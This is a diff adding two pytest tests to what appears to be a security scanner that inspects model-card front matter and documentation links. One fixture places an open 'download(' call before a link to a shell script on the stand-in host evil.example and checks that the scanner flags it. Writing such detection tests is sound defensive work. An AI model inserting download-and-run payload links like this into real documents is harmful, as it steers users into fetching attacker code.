@@ -3205,6 +3205,29 @@ def test_text_scanner_call_context_limit_does_not_reclassify_cc_findings(tmp_pat
     assert determine_exit_code(aggregate) == 1
 
 
+@pytest.mark.parametrize("newline", ["\n", "\r\n"])
+def test_model_card_language_list_bounds_documentation_call_context(tmp_path: Path, newline: str) -> None:
+    content = (
+        "---\nlanguage:\n"
+        + "- en\n" * 240
+        + "---\nModel (multilingual).\n[guide](https://docs.example.com/reference)\n"
+    )
+    _assert_documentation_informational(tmp_path, content.replace("\n", newline))
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        "---\nlanguage: en\n---\ndownload(",
+        "---\nlanguage: en\n---\ndownload(\n",
+        "---\ndownload(\n---\n",
+        "---\nlanguage: en\ndownload(\n",
+    ],
+)
+def test_model_card_metadata_preserves_open_calls(tmp_path: Path, prefix: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(tmp_path, prefix + "[payload](https://evil.example/payload.sh)\n)\n")
+
+
 def test_text_scanner_completed_fence_bounds_dense_call_context(tmp_path: Path) -> None:
     _assert_documentation_informational(
         tmp_path,
